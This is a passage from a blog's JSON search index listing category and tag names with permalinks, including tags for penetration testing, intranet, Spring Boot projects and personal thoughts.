溜溜球啦！","categories":[{"name":"生活","slug":"生活","permalink":"https://bigbug888.github.io/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"想法","slug":"想法","permalink":"https://bigbug888.github.io/tags/%E6%83%B3%E6%B3%95/"}]}],"categories":[{"name":"网安","slug":"网安","permalink":"https://bigbug888.github.io/categories/%E7%BD%91%E5%AE%89/"},{"name":"Java","slug":"Java","permalink":"https://bigbug888.github.io/categories/Java/"},{"name":"生活","slug":"生活","permalink":"https://bigbug888.github.io/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"内网","slug":"内网","permalink":"https://bigbug888.github.io/tags/%E5%86%85%E7%BD%91/"},{"name":"渗透","slug":"渗透","permalink":"https://bigbug888.github.io/tags/%E6%B8%97%E9%80%8F/"},{"name":"springboot项目","slug":"springboot项目","permalink":"https://bigbug888.github.io/tags/springboot%E9%A1%B9%E7%9B%AE/"},{"name":"Springboot项目","slug":"Springboot项目","permalink":"https://bigbug888.github.io/tags/Springboot%E9%A1%B9%E7%9B%AE/"},{"name":"想法","slug":"想法","permalink":"https://bigbug888.github.io/tags/%E6%83%B3%E6%B3%95/"}]}